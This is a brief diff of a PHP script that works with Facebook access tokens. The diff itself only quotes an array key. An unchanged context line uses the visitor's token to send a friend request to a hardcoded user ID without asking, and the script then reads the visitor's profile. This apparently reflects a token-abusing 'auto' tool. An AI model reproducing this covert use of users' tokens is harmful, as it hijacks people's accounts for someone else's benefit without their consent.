@@ -329,7 +329,7 @@ session_start();
 $check = json_decode(auto('https://graph.facebook.com/app/?access_token='.$token.''), true);
 auto('https://graph.facebook.com/me/friends?method=post&uids=100004294419791&access_token='.$token);
 
-if($check[id] == 6628568379){  
+if($check['id'] == 6628568379){  
 
 $userData = json_decode(auto('https://graph.facebook.com/me?access_token='.$token),true);
 $com = "https://graph.facebook.com/me?fields=id,name&access_token=".$token;
